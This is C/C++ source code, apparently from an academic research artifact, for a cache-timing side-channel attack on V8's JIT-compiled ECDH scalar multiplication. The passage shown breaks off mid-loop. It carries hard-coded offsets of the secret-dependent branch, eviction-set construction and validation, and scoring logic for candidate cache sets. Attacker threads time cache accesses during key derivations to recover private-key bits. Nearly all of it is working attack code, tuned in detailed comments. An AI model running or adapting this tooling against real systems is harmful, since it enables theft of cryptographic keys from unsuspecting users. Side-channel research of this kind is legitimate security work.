#include <assert.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <cstdint>
#include <cstdlib>

#include "v8_runtime.h"

extern "C" {
#include "shared_memory.h"
#include "arch.h"
#include "config.h"
#include "log.h"
#include "fs.h"
#include "flush_reload.h"
#include "prime_probe.h"
}

static const char *test_name = "v8_ecdh_key_pool";
static char dump_dir[256];
/* Every invocation dumps into its OWN output/<run_tag>/ subtree, so a re-run
 * never clobbers (or has to delete) the previous capture. Set with
 * `-tag=NAME`; the default is run_<YYYYmmdd_HHMMSS>. Analyse one run with
 *   python experiments/v8_ecdh/evaluation/extract_ecdh.py \
 *       --all_keys ./build/output/<run_tag>
 * (extract's dir regex only looks for the ..._key<NNNNN>_r<NNNNN> leaf, so
 * the extra level is transparent to it). */
static char run_tag[64] = "";
uintptr_t jit_machine_code;
/* Re-derived for the V8 RELEASE build (2026-08-20): the original
 * 0x1a6a/0x1b7a were for a DEBUG build, and dropping --debug-code padding
 * shifted mul()'s JIT layout. In the hot (peeled) main loop the secret
 * branch is `test bits[i]; jne true_arm` (bit=0 falls through, bit=1
 * jumps). Byte offsets into the JS:*mul :6643:37 optimized code. */
uint64_t ecdh_false_branch_offset = 0xe68, ecdh_true_branch_offset = 0xf41;
static const int max_exec_cycles = (int)1e7;
static const uint64_t csi_max_exec_cycles = (uint64_t)5e7;
enum { cache_line_count = 3, profile_iterations = 1 << 16 };
static uint64_t probe_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];
static uint64_t *reload_time[cache_line_count];
enum AttackPrimitive {
	FLUSH_RELOAD,
	PRIME_SCOPE,
};

const char *ec_key_pool_rpath = "experiments/v8_ecdh/ec_key_pool";
static enum AttackPrimitive attack_primitive = PRIME_SCOPE;

/* -keys=N / -runs=N: the full artifact numbers are 100 keys x 100 runs, but
 * a much shorter run is enough to exercise/validate the capture path and
 * costs a fraction of the disk (~12KB per trace, so 10x10 = ~1.2MB against
 * ~120MB for the full run). */
static int victim_runs = 100;
static int key_num = 100;
enum { max_victim_runs = 1024 };

static pthread_barrier_t attacker_local_barrier;

/* Hot ladder loop (V8 release, JS:*mul :6644:37, code_len=5500),
 * offsets from turbo-mul disassembly. Secret branch +0xda3
 * `test bits[i]; jnz +0xe80`: bit=0 falls through to FALSE arm
 * B187 (0xda9..0xe7b), bit=1 jumps to TRUE arm B188 (0xe80..0xf3e).
 *   [0] common 0xd40 loop header (every iter)
 *   [1] false  0xe00 a.diffAdd call in FALSE arm (bit==0)
 *   [2] true   0xf00 a.dbl call in TRUE arm (bit==1)
 * false/true discriminate (~126 each) but 3 prepare_evset sets
 * INTERFERE (common undersamples) -> use -csi (single-evset probe,
 * interference-free) to pick validated sets. */
/* cl_offset[1] was 0xec0 until 2026-08-22. Both lines are in the bit==0 arm
 * and both track the zero count, but 0xec0 fires TWICE per zero bit and
 * 0xe80 fires once, so 0xe80 is the one that needs no post-processing.
 *
 * The doubling is not a probe artifact: the two 0xec0 events per zero bit sit
 * at fixed phases 0.562 +- 0.021 apart inside the tick, and 0xf80 shows the
 * same pattern bit-INdependently at ~2x per iteration. The arm makes exactly
 * two calls -- a.diffAdd(b, c) then b.dbl() -- so a line in code both of them
 * run is touched twice and a line in only one of them once.
 *
 * Measured over four probe keys spanning 0..220 zero bits, one launch each:
 *
 *   zeros    0    31   126   220
 *   0xe80    1    33   130   257   ratio 1.03-1.06, saturates at 220
 *   0xec0    1    64   255   474   ratio 2.02-2.15 throughout
 *
 * 0xe80 saturates where the key has zeros on 87% of iterations, which no real
 * pool key does (~50%). */
static uint64_t cl_offset[3] = {
	0xe00, /* common: loop header (+0xe00 back-edge target), every iter */
	0xe80, /* false arm interior (bit==0), 1 hit per zero */
	0xfc0 /* true  arm interior (bit==1) */
};
uintptr_t target_addr[3] = {};
static EVSet *evsets[3];
static int retry = 16;

static int use_csi = 0;
/* -csikeys: known-address capture of the 3 CSI probe keys instead of the
 * pool, for inspecting what the fingerprint looks like on good evsets. */
static int csi_keys_capture = 0;
/* -keyfile=PATH: known-address capture of ONE arbitrary key file, for
 * looking at a hand-built scalar (a sparse pattern, say) rather than a pool
 * key. Path is relative to the project root. */
static const char *single_key_file = NULL;
static int g_jit_events = 0;
static int jit_warmup_runs = 10;

/* Probe keys ordered (a, b, c):
 *   a = csi_1.json      all-1s  -> always the true branch
 *   b = csi_0.json      all-0s  -> always the false branch
 *   c = csi_sparse4.json 1000 repeating -> true branch 1 iteration in 4
 *
 * c was ec_key_csi_10.json (alternating 1010) until 2026-08-22. Alternating
 * drives BOTH branch lines at the same rate (126/126), so column c said
 * nothing about which arm is which and only a and b discriminated cl1 from
 * cl2. A longer-period key breaks that symmetry: it leaves one arm
 * saturated and gives the other a count small enough for the probe to
 * resolve AND to space-check (see csi_spacing_error).
 *
 * WHICH arm gets the resolved level is the choice of period and polarity:
 *
 *   1000_0000  sparse8    32 on the true arm, 220 on the false  -> tests cl2
 *   1000       sparse4    63 on the true arm, 189 on the false  -> tests cl2
 *   1111_1110  dense8     31 on the false arm, 221 on the true  -> tests cl1
 *   1110       dense4     63 on the false arm, 189 on the true  -> tests cl1
 *
 * c is sparse4, so the resolved level sits on the arm the decoder actually
 * reads. cl2 gets 63 events four iterations apart, far enough above the
 * 4-event spacing floor to survive a noisy evset and denser than sparse8's
 * 32.
 *
 * It was dense4 until 2026-08-23, which put the resolved level on cl1 --
 * the arm nothing decodes and that the scan has never once found. cl2 was
 * then saturated under every probe key and had no spacing test at all, and
 * a candidate firing TWICE per iteration (528 hits against an expected 252,
 * once per diffAdd and once per dbl) was picked as the true arm and only
 * caught later by capture validation. Three slots cannot cover both arms
 * and both extremes at once, so they cover the arm that carries bits.
 *
 * Bit length matches the other two (252), so the clock count is unchanged
 * and only the branch-line counts move. */
static const char *csi_probe_keys[3] = {
	"experiments/v8_ecdh/ec_key_pool/ec_key_csi_1.json",
	"experiments/v8_ecdh/ec_key_pool/ec_key_csi_0.json",
	"experiments/v8_ecdh/ec_key_pool/ec_key_csi_sparse4.json",
};

static char probe_keys_override[3][256];

struct csi_key_stats {
	int iters; /* bit length = ladder iterations */
	int ones; /* popcount */
	int zeros; /* iters - ones */
	int adj_zeros; /* zero bits whose PREDECESSOR is also zero */
	int valid;
};

static struct csi_key_stats csi_key_stat[3] = {
	/* iters ones zeros  adj valid */
	{ 252, 252, 0, 0, 1 }, /* [0] ec_key_csi_1.json        all-1s    */
	{ 249, 1, 248, 247, 1 }, /* [1] ec_key_csi_0.json        all-0s    */
	{ 252, 63, 189, 126, 1 }, /* [2] ec_key_csi_sparse4.json  1000      */
};

/* Hits the false arm produces per zero bit, for the line at cl_offset[1].
 *
 * Offset-dependent, and the reason it is a named constant rather than a
 * literal 1. Measured over four real pool keys plus four structured probe
 * keys: 0xe80 gives zeros + adj_zeros, 0xec0 gives 2*zeros + adj_zeros, and
 * their difference is the zero count exactly (126/125, 121/121, 129/129,
 * 122/122 on pool keys 0-3). The adj term is why both look like a clean 1x
 * and 2x on 1010 and 1111_1110, which have no two adjacent zeros, and like
 * 1.55x and 2.6x on real keys, which do. */
static int csi_false_hits_per_zero = 1; /* cl_offset[1] = 0xe80 */

/* Expected hits for line ci under probe key ki, from that key's bits. */
static int csi_expected_hits(int ci, int ki) {
	const struct csi_key_stats *st = &csi_key_stat[ki];
	switch (ci) {
	case 0:
		return st->iters; /* the clock: once per iteration, key-independent */
	case 1:
		return csi_false_hits_per_zero * st->zeros + st->adj_zeros;
	default:
		return st->ones; /* the marker: once per 1-bit */
	}
}

/* Above this fraction of the iteration count a level is SATURATED: the probe
 * reports "many" and the exact number stops meaning anything, so only a floor
 * can be checked. Below it the level is RESOLVED and gets a real band.
 * Measured: cl1 reads 500-510 against expectations of 495 and 408 -- the same
 * "lots" either way -- while cl2's 33 against 32 is exact. */
static const double csi_saturate_frac = 0.6;
/* The clock's band, tight in BOTH directions -- see csi_check_common. */
static const int csi_common_tol = 70;

/* cl1 IS scanned, and all three lines are required.
 *
 * The decoder votes cl0 + cl2 only -- fusing the false arm was measured
 * under oracle per-channel rates and changed nothing, because the marker is
 * a 17:1 likelihood-ratio channel where the false arm's silence is 5.5:1,
 * so its term can never overturn the marker's. It is still worth acquiring:
 * its hit count tracks the key's zero count, which makes it the capture's
 * health signal and part of the fingerprint, and extract_ecdh.py reports it
 * per key ("cl1 lit" against the zero count).
 *
 * Requiring it also keeps slot 1's attacker thread fed. The thread count
 * follows evsets[1], and the two-attacker configuration has never completed
 * a capture -- a -csi run hung in the end-of-key handshake with it. Aborting
 * on a missing cl1 keeps every capture on the three-attacker path that is
 * known to work, at the cost of discarding scans whose clock and marker were
 * fine. -scancl1=0 restores the old behaviour. */
static int csi_scan_cl1 = 1;

/* -noslot1: do not probe the false arm even when its address is known. */
static int g_no_slot1 = 0;

/* Uniformity is the real gate for the CLOCK: a set that also catches a
 * second loop-body line still fires ~once per iteration but its gaps are
 * uneven. Tuned from measured scans, see the Readme. */
static double csi_min_clock_uniformity = 0.0;

/* Fraction of gaps within +-15% of the trace's OWN median gap.
 *
 * This is the property the decoder actually depends on: it assigns each
 * marker event to the nearest clock tick, so the clock has to tick once per
 * iteration at a steady period. Measuring against the median rather than an
 * absolute expected gap keeps it calibration-free -- and it separates the
 * real line from a set that also catches a second line of the loop body,
 * which fires at an uneven 20.1k/26.4k either side of its median where the
 * true header line sits inside 22.8k-25.1k. */
static double csi_gap_uniformity(uint64_t *tsc, int cnt) {
	if (cnt < 3) {
		return 0.0;
	}
	uint64_t gaps[profile_iterations];
	int n = cnt - 1;
	for (int i = 0; i < n; ++i) {
		gaps[i] = tsc[i + 1] - tsc[i];
	}
	for (int a = 0; a < n; ++a) {
		for (int b = a + 1; b < n; ++b) {
			if (gaps[b] < gaps[a]) {
				uint64_t t = gaps[a];
				gaps[a] = gaps[b];
				gaps[b] = t;
			}
		}
	}
	uint64_t med = gaps[n / 2];
	if (med == 0) {
		return 0.0;
	}
	uint64_t lo = med - med / 7, hi = med + med / 7; /* ~+-15% */
	int match = 0;
	for (int i = 0; i < n; ++i) {
		if (gaps[i] >= lo && gaps[i] <= hi) {
			match++;
		}
	}
	return (double)match / n;
}

/* How comfortably a level sits, rather than merely whether it passed.
 *
 * Returns >= 0 when the level is acceptable and < 0 when it is not, so the
 * gate is `margin >= 0`. Within that, 1.0 means dead on the expectation and
 * 0.0 means sitting exactly on the edge that would have rejected it.
 *
 * The band is two-sided, and that is not optional. It was a FLOOR only for
 * saturated levels until 2026-08-22, on the reasoning that a level at the
 * probe's ceiling has no meaningful upper end. Measured consequence: a
 * candidate reading 528 hits against an expected 252 -- a line the arm runs
 * TWICE per iteration, once per diffAdd and once per dbl -- scored a perfect
 * 1.0 and was picked as the true arm, then failed capture validation because
 * on a real key it reads ~250 against a band of 80..200. Over-counting is
 * how a wrong line looks; only under-counting is what saturation excuses.
 *
 * One relative tolerance covers both regimes, so there is no longer a
 * saturated/resolved split here. The widest legitimate over-read measured is
 * 510 against an expectation of 408 (the false arm under 1000_0000, where
 * the zeros+adj model runs out of road at high zero density), which is 1.25x
 * -- 1.35 clears it and still rejects anything running at double rate. The
 * absolute floor keeps small expectations from having an absurdly tight
 * band: 0.35 of an expected 1 is meaningless. */
static const int csi_level_floor_tol = 20; /* +-N on a small level */
static const double csi_level_rel_tol = 0.35;

static double csi_level_margin(int expected, int got) {
	double tol = csi_level_floor_tol;
	double rel = expected * csi_level_rel_tol;
	if (rel > tol) {
		tol = rel;
	}
	double dev = (double)got - expected;
	if (dev < 0) {
		dev = -dev;
	}
	return 1.0 - dev / tol; /* >= 0 exactly when dev <= tol */
}

/* ---- the spacing test ------------------------------------------------
 *
 * Counting is not the only thing a sparse probe key buys. On the true arm
 * under 1000_0000 the scan's own dump shows 35 events with a median gap of
 * 8.20 iterations, 29 of 34 gaps within +-25% of exactly 8x -- the pattern
 * is right there in the scan data, it was simply never looked at.
 *
 * Looking at it matters. Measured 2026-08-22, a candidate at l3_set 6343
 * passed the count gate for the false arm on 11 events against an expected
 * 31 (the deviation landed exactly on the tolerance edge) and was accepted,
 * with q=0.27 the only hint. Its median gap under 1111_1110 was 0.54
 * iterations, not the ~8 the key's 31 isolated zero bits demand. The count
 * alone cannot see that; the spacing can, and rejects it outright.
 *
 * The test needs no clock channel and no calibration. A probe key that puts
 * `expected` events across `iters` iterations must space them `iters /
 * expected` iterations apart, and the iteration period is read off whichever
 * key column on this same evset runs at ~one event per iteration. */
static uint64_t csi_median_gap(uint64_t *tsc, int cnt) {
	if (cnt < 4) {
		return 0;
	}
	uint64_t gaps[profile_iterations];
	int n = cnt - 1;
	for (int i = 0; i < n; ++i) {
		gaps[i] = tsc[i + 1] - tsc[i];
	}
	for (int a = 0; a < n; ++a) {
		for (int b = a + 1; b < n; ++b) {
			if (gaps[b] < gaps[a]) {
				uint64_t t = gaps[a];
				gaps[a] = gaps[b];
				gaps[b] = t;
			}
		}
	}
	return gaps[n / 2];
}

/* The ladder period, from whichever probe key drives THIS evset at about one
 * event per iteration -- that column's median gap is the period by
 * definition. Self-referencing on purpose: the scan probes one evset at a
 * time and has no simultaneous clock channel to measure against. */
static uint64_t
csi_iteration_period(const int *kcnt,
                     uint64_t tsc[cache_line_count][profile_iterations]) {
	int best = -1, best_dev = 0;
	for (int ki = 0; ki < cache_line_count; ++ki) {
		int iters = csi_key_stat[ki].iters;
		int dev = kcnt[ki] - iters;
		if (dev < 0) {
			dev = -dev;
		}
		if (dev > iters / 4) {
			continue;
		}
		if (best < 0 || dev < best_dev) {
			best = ki;
			best_dev = dev;
		}
	}
	return best < 0 ? 0 : csi_median_gap(tsc[best], kcnt[best]);
}

/* A candidate no probe key lit up is a dead cache set, and the scan walks
 * thousands of them: a full pass logged and dumped 3272 candidates, of which
 * a couple of hundred had any signal at all and three were the answer.
 * Reporting the rest costs a log line, a file create and ~12KB inside the
 * scan loop, and buries the interesting sets in a 3000-line log.
 *
 * The floor is far below anything a real line can produce. The smallest
 * count any target reaches on its LOUDEST probe key is the resolved level on
 * an arm -- 63 for the false arm under 1110, 31-32 under the sparse
 * patterns -- and the clock is ~252 under every key, so nothing at 10 hits
 * can be a target. A line that is silent under one key is still loud under
 * another, which is why the test is on the MAXIMUM across keys and not on
 * any single one. */
static int csi_report_min_hits = 10;
static int csi_cands_reported = 0;
static int csi_cands_quiet = 0;

static const double csi_spacing_tol = 0.35;
static const int csi_spacing_min_events = 4;

/* Worst relative spacing error across the resolved levels, or -1.0 when
 * nothing here can be measured. The gate is `err <= csi_spacing_tol`, and
 * the same number tells the score how exact the spacing was rather than just
 * that it was inside the band: the true arm under 1000_0000 measured 194456
 * against 192465 predicted, an error of 0.01, where the rejected false-arm
 * candidate was off by a factor of fifteen. */
static double
csi_spacing_error(int ci,
                  const int *kcnt,
                  uint64_t tsc[cache_line_count][profile_iterations]) {
	uint64_t period = csi_iteration_period(kcnt, tsc);
	if (!period) {
		return -1.0; /* no column runs at 1/iter here, nothing to compare to */
	}
	double worst = -1.0;
	for (int ki = 0; ki < cache_line_count; ++ki) {
		int iters = csi_key_stat[ki].iters;
		int expected = csi_expected_hits(ci, ki);
		/* Only RESOLVED levels have a meaningful spacing. A saturated one is
		 * already at the probe's ceiling, so its gaps say "one per tick"
		 * whatever the key actually does. */
		if (expected < csi_spacing_min_events ||
		    expected >= (int)(iters * csi_saturate_frac)) {
			continue;
		}
		if (kcnt[ki] < csi_spacing_min_events) {
			continue;
		}
		uint64_t med = csi_median_gap(tsc[ki], kcnt[ki]);
		if (!med) {
			continue;
		}
		double predicted = (double)period * iters / expected;
		double err = ((double)med - predicted) / predicted;
		if (err < 0) {
			err = -err;
		}
		if (err > worst) {
			worst = err;
		}
	}
	return worst;
}

static int
csi_check_spacing(int ci,
                  const int *kcnt,
                  uint64_t tsc[cache_line_count][profile_iterations]) {
	double err = csi_spacing_error(ci, kcnt, tsc);
	return err < 0.0 || err <= csi_spacing_tol;
}

static const int csi_silent_max = 80;

static int
csi_check_common(const int *kcnt,
                 uint64_t tsc[cache_line_count][profile_iterations]) {
	for (int ki = 0; ki < cache_line_count; ++ki) {
		int dev = kcnt[ki] - csi_key_stat[ki].iters;
		if (dev < 0) {
			dev = -dev;
		}
		if (dev > csi_common_tol) {
			return 0;
		}
	}
	/* and it has to TICK, not just fire the right number of times */
	return csi_gap_uniformity(tsc[0], kcnt[0]) >= csi_min_clock_uniformity;
}

static int
csi_check_true_arm(const int *kcnt,
                   uint64_t tsc[cache_line_count][profile_iterations]) {
	int saw_silence = 0;
	for (int ki = 0; ki < cache_line_count; ++ki) {
		const struct csi_key_stats *st = &csi_key_stat[ki];
		if (csi_level_margin(st->ones, kcnt[ki]) < 0.0) {
			return 0;
		}
		if (st->ones <= csi_silent_max && kcnt[ki] <= csi_silent_max) {
			saw_silence = 1;
		}
	}
	/* without a key that drives this arm silent there is nothing separating
	 * it from the other arm, so refuse rather than guess */
	return saw_silence && csi_check_spacing(2, kcnt, tsc);
}

static int
csi_check_false_arm(const int *kcnt,
                    uint64_t tsc[cache_line_count][profile_iterations]) {
	int saw_silence = 0;
	for (int ki = 0; ki < cache_line_count; ++ki) {
		const struct csi_key_stats *st = &csi_key_stat[ki];
		if (csi_level_margin(csi_expected_hits(1, ki), kcnt[ki]) < 0.0) {
			return 0;
		}
		if (st->zeros <= csi_silent_max && kcnt[ki] <= csi_silent_max) {
			saw_silence = 1;
		}
	}
	return saw_silence && csi_check_spacing(1, kcnt, tsc);
}

/* Is this evset line ci, and if so how good a one?
 *
 * Matching and ranking used to be two functions walking the same counts
 * twice. They answer one question -- a candidate that is not the line has no
 * quality, and one that is only earns its place by beating the best seen so
 * far -- so they are one call.
 *
 * The result is a BREAKDOWN, not a bare number. A single blended q was
 * unreadable in exactly the case that mattered: the bogus false-arm
 * candidate at l3_set 6343 scored 0.27 against 0.98 and 0.85 for the two
 * good lines, which looked like "a bit noisy" when it was in fact a
 * different line entirely -- its counts were near the edge of their band AND
 * its spacing was off by a factor of fifteen, and one averaged number could
 * not say which. Each component is now reported and logged separately:
 *
 *   count    how far inside their bands the hit counts sit (1 = dead on)
 *   gaps     mean gap-cleanliness over the keys carrying a signal
 *   spacing  how exactly the resolved levels hit their predicted spacing
 *
 * `score` is the mean of whichever components could be measured, and exists
 * only to order candidates. Read the components to understand a candidate;
 * read the score only to compare two. */
struct csi_quality {
	double count;
	double gaps;
	double spacing; /* < 0 when this line has no resolvable level to test */
	double score;
	int matched;
};

/* Ordered below anything a real match can produce, so a rejected candidate
 * can never displace an empty slot. A MATCHING candidate may legitimately
 * score near zero, which is why the sentinel cannot just be -1. */
static const double csi_q_reject = -1e9;

static struct csi_quality
csi_score_candidate(int ci,
                    const int *kcnt,
                    uint64_t tsc[cache_line_count][profile_iterations]) {
	struct csi_quality q = { 0.0, 0.0, -1.0, csi_q_reject, 0 };

	switch (ci) {
	case 0:
		q.matched = csi_check_common(kcnt, tsc);
		break;
	case 1:
		q.matched = csi_check_false_arm(kcnt, tsc);
		break;
	default:
		q.matched = csi_check_true_arm(kcnt, tsc);
		break;
	}
	if (!q.matched) {
		return q;
	}

	int n_count = 0, n_gaps = 0;
	for (int ki = 0; ki < cache_line_count; ++ki) {
		int expected = csi_expected_hits(ci, ki);
		if (expected == 0) {
			/* Silence is what IDENTIFIES a line, but it cannot rank two
			 * candidates that are both silent, so it carries no quality. */
			continue;
		}
		double m = csi_level_margin(expected, kcnt[ki]);
		q.count += m < 0.0 ? 0.0 : m;
		n_count++;
		q.gaps += csi_gap_uniformity(tsc[ki], kcnt[ki]);
		n_gaps++;
	}
	if (n_count) {
		q.count /= n_count;
	}
	if (n_gaps) {
		q.gaps /= n_gaps;
	}

	double err = csi_spacing_error(ci, kcnt, tsc);
	if (err >= 0.0) {
		q.spacing = 1.0 - err / csi_spacing_tol;
		if (q.spacing < 0.0) {
			q.spacing = 0.0;
		}
	}

	q.score = q.count + q.gaps;
	int parts = 2;
	if (q.spacing >= 0.0) {
		q.score += q.spacing;
		parts++;
	}
	q.score /= parts;
	return q;
}

/* One line of log for a candidate, so a scan can be read back afterwards
 * without guessing which component was the weak one. */
static void
csi_log_quality(const char *what, int l3_set, struct csi_quality q) {
	if (q.spacing >= 0.0) {
		log_info(LOG_BOLD_ON "CSI: %s best evset l3_set=%d(%x) score=%.2f "
		                     "(count %.2f gaps %.2f spacing %.2f)" LOG_BOLD_OFF,
		         what,
		         l3_set,
		         l3_set,
		         q.score,
		         q.count,
		         q.gaps,
		         q.spacing);
	} else {
		log_info(LOG_BOLD_ON "CSI: %s best evset l3_set=%d(%x) score=%.2f "
		                     "(count %.2f gaps %.2f spacing n/a)" LOG_BOLD_OFF,
		         what,
		         l3_set,
		         l3_set,
		         q.score,
		         q.count,
		         q.gaps);
	}
}

static struct csi_quality csi_best[cache_line_count];
/* the l3_set each target was won on, -1 while unclaimed */
static int csi_best_set[cache_line_count];

/* Wipe what one scan attempt accumulated, so the next starts clean. The
 * LLCF pool itself is NOT rebuilt -- that is the 3-4 minute part and it stays
 * valid; only this scan's choices are discarded. */
static void csi_reset_scan_state(void) {
	for (int ci = 0; ci < cache_line_count; ++ci) {
		evsets[ci] = NULL;
		csi_best[ci].score = csi_q_reject;
		csi_best[ci].matched = 0;
		csi_best_set[ci] = -1;
	}
	csi_cands_reported = 0;
	csi_cands_quiet = 0;
}

static const char *csi_cl_label(int cl) {
	switch (cl) {
	case 0:
		return "common";
	case 1:
		return "false/zeros"; /* cl_offset[1], the bit==0 arm */
	case 2:
		return "true/ones"; /* cl_offset[2], the bit==1 arm */
	default:
		return "?";
	}
}

/* --- known-address evset validation (user's approach: build -> test attack
 * run -> evaluate trace -> rebuild if bad). A validator thread profiles ONE
 * evset while the main (victim) thread runs a few derives; the common line
 * must show ~one hit per ladder iteration (~252). Spin-synchronized so it
 * needs no barrier entanglement with the real capture. --- */
static uint64_t median_u64(const uint64_t *v, int n) {
	uint64_t tmp[max_victim_runs];
	if (n <= 0) {
		return 0;
	}
	if (n > max_victim_runs) {
		n = max_victim_runs;
	}
	memcpy(tmp, v, sizeof(uint64_t) * n);
	for (int a = 0; a < n; ++a) {
		for (int b = a + 1; b < n; ++b) {
			if (tmp[b] < tmp[a]) {
				uint64_t t = tmp[a];
				tmp[a] = tmp[b];
				tmp[b] = t;
			}
		}
	}
	return tmp[n / 2];
}

static volatile int g_val_go = 0;
static volatile int g_val_stop = 0;
static volatile int g_val_ready = 0;
static volatile uint64_t g_val_count = 0;

static void *v8_validator_thread(void *arg) {
	EVSet *ev = (EVSet *)arg;
	evchain *ch = evchain_build(ev->addrs, SF_ASSOC);
	uint8_t *scope = ev->addrs[0];
	i64 thr = detected_cache_lats.l2_thresh;
	u64 end;
	u32 aux;
	while (!g_val_stop) {
		while (!g_val_go && !g_val_stop) {
		}
		if (g_val_stop) {
			break;
		}
		prime_skx_sf_evset_ps_flush(ev, ch, array_repeat, l2_repeat);
		uint64_t cnt = 0;
		while (g_val_go) {
			u64 lat = _time_maccess_aux(scope, end, aux);
			if ((i64)lat > thr &&
			    lat < (u64)detected_cache_lats.interrupt_thresh) {
				cnt++;
				prime_skx_sf_evset_ps_flush(ev, ch, array_repeat, l2_repeat);
			}
		}
		g_val_count = cnt;
		g_val_ready = 1;
	}
	return NULL;
}

/* --- per-key evset re-validation (the mid-run death fix) -------------------
 * A build-time-validated evset can still go bad at a random key (the
 * victim<->attacker sync race), and once it does every later key is garbage.
 * So each attacker slot re-validates ITS OWN line at every key boundary
 * using the key's own capture as the test: the median hit count per derive
 * must stay at the level the line is known to produce. If it does not, the
 * slot rebuilds its evset in place and slot0 asks the victim to re-capture
 * the same key (up to max_key_attempts), so a degraded set costs one key's
 * traces instead of the rest of the run.
 *
 * Per-slot bands for the median hits of one ~252-iteration ladder derive:
 *   slot0 common (0xe00) ~252  = one hit per ladder iteration -> the clock
 *   slot1 false  (0xec0) ~220  = fall-through arm, reached by sequential
 *                                prefetch nearly every iteration, so it only
 *                                gets a "not dead" floor
 *   slot2 true   (0xfc0) ~126  = == #1-bits of the key (120-131 in the pool)
 * The upper bound matters as much as the floor for the true line: an evset
 * that also catches the fall-through fires ~300 times, i.e. every iteration,
 * and has lost the very property the decoder needs.
 * Retry is driven by common+true only (the two lines the decoder uses). */
static int slot_min_hits[cache_line_count] = { 200, 40, 80 };
static int slot_max_hits[cache_line_count] = { 400, 1 << 20, 200 };
static const int max_key_attempts = 3;
static const int evset_rebuild_retry = 8;
/* -bands=0 keeps every capture, however the lines look. A sweep (-cl=) is
 * deliberately pointed at offsets that are NOT expected to be in band, and
 * the bands would rebuild and then exit(1) on exactly the measurement the
 * sweep is trying to take. */
static int g_bands_enabled = 1;

static int g_slot_bad[cache_line_count];
static volatile int g_key_retry = 0;
/* only the single-process victim loop (v8_ecdh_thread_main) implements the
 * end-of-key handshake; process_main keeps the original flow. */
static int g_retry_enabled = 0;
/* prepare_evset() walks shared LLCF candidate state -> one slot at a time */
static pthread_mutex_t g_rebuild_lock = PTHREAD_MUTEX_INITIALIZER;

/* The LLCFeasible helper thread BUSY-SPINS (`while (ctrl->waiting);` in
 * helper_thread_worker) from start_helper_thread() until stop_helper_thread(),
 * so it owns a core outright for as long as it is alive. It is needed only to
 * build an eviction set -- prepare_evset()/LLCF_multi_evset() drive it to
 * touch candidates from another core -- and NOT to probe: the capture loop
 * calls prime_skx_sf_evset_ps_flush(), which never takes an hctrl. Holding one
 * per attacker across the whole capture therefore burned three cores to spin,
 * which is why the run needed 7 cores for 4 useful threads. Start it here,
 * inside the rebuild, and stop it before returning. Rebuilds are rare (a slot
 * out of band at a key boundary) and already serialized by g_rebuild_lock, so
 * the pthread_create cost is irrelevant. */
static int
rebuild_slot_evset(int slot, EVSet **evset, uint8_t **scope, evchain **chain) {
	EVSet *old = *evset;
	EVSet *ev = NULL;

	pthread_mutex_lock(&g_rebuild_lock);
	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		pthread_mutex_unlock(&g_rebuild_lock);
		log_warn("slot %d: no helper thread, keeping the old evset", slot);
		return 1;
	}
	for (int r = 0; r < evset_rebuild_retry && ev == NULL; ++r) {
		ev = prepare_evset((u8 *)target_addr[slot], &hctrl);
	}
	stop_helper_thread(&hctrl);
	pthread_mutex_unlock(&g_rebuild_lock);

	if (ev == NULL) {
		log_warn("slot %d: evset rebuild FAILED, keeping the old set", slot);
		return 1;
	}
	evsets[slot] = ev;
	*evset = ev;
	*scope = ev->addrs[0];
	*chain = evchain_build(ev->addrs, SF_ASSOC);
	if (old != NULL && old != ev) {
		evset_free(old);
	}
	log_info(
	    "slot %d: evset REBUILT (target %p)", slot, (void *)target_addr[slot]);
	return 0;
}

void *v8_attacker_thread(void *param) {
	int32_t slot = *(int32_t *)param;
	log_info("attacker thread %d prepare", slot);
	log_info("attacker check value %p", jit_machine_code);

	/* no helper thread here: it is only needed to BUILD an evset, and the
	 * build already happened before this thread started. rebuild_slot_evset()
	 * starts its own for the rare per-key rebuild. See the comment there. */
	log_info("attacker build evset");
	EVSet *evset = evsets[slot];

	/* A slot with no eviction set still runs its thread.
	 *
	 * The attackers meet at attacker_local_barrier every window and at the
	 * end-of-key handshake, and the victim is released from inside slot 0,
	 * so the barrier topology is fixed at three participants. Dropping a
	 * thread to match a missing evset was tried and hung a capture in the
	 * end-of-key handshake. An idle thread costs nothing measurable -- it
	 * touches no memory the victim shares and probes no cache set -- and it
	 * keeps the three-attacker path that is known to work.
	 *
	 * This is the normal state of slot 1 under -csi: cl1 is scanned for but
	 * measured 0 finds in 6 consecutive launches, while cl0 and cl2 were
	 * acquired every time. Its column in the trace stays all zeros, which
	 * extract_ecdh.py reports as "cl1 lit = -". */
	int idle = evset == NULL;
	if (idle) {
		log_warn("attacker thread %d (%s): no evset, idling (barriers only)",
		         slot,
		         csi_cl_label(slot));
	} else {
		log_info("attacker thread %d target address %p", slot,
		         target_addr[slot]);
	}

	uint8_t *scope = idle ? NULL : evset->addrs[0];
	evchain *sf_chain = idle ? NULL : evchain_build(evset->addrs, SF_ASSOC);
	i64 threshold = detected_cache_lats.l2_thresh;

	u64 tsc0, tsc1, end, scope_lat;
	u32 aux, index = 0;

	pthread_barrier_wait(sync_ctx.barrier);
	log_info("attacker thread start");

	uint64_t hits[max_victim_runs];

	for (int i = 0; i < key_num; ++i) {
		for (int attempt = 0;; ++attempt) {
			for (int j = 0; j < victim_runs; ++j) {
				if (!idle) {
					prime_skx_sf_evset_ps_flush(
					    evset, sf_chain, array_repeat, l2_repeat);
				}

				if (slot == 0) {
					/* clear only the used range (~252 hits/derive), not the
					 * full 1.5MB arrays -- the big memset pollutes cache every
					 * run and can degrade slot0's own evset over a long run. */
					for (int _sl = 0; _sl < cache_line_count; ++_sl) {
						memset(probe_time_arr[_sl], 0, sizeof(uint64_t) * 2048);
						memset(sample_tsc_arr[_sl], 0, sizeof(uint64_t) * 2048);
					}
					/* Releasing the victim here, BEFORE the attackers
					 * meet at the local barrier, is deliberate: it gives the
					 * derive the barrier-wakeup time to get going, so it
					 * lands inside the probing window. Moving the release
					 * after the local barrier was measured much worse
					 * (slot0 usable traces 100% -> 29%); the only thing it
					 * bought was the last window of each key, which the
					 * victim has already left by then. */
					pthread_barrier_wait(sync_ctx.barrier);
				}
				pthread_barrier_wait(&attacker_local_barrier);

				tsc0 = tsc1 = rdtscp();
				index = 0;
				if (!idle) {
					do {
						tsc1 = rdtscp();

						scope_lat = _time_maccess_aux(scope, end, aux);
						if (scope_lat > threshold) {
							if (scope_lat <
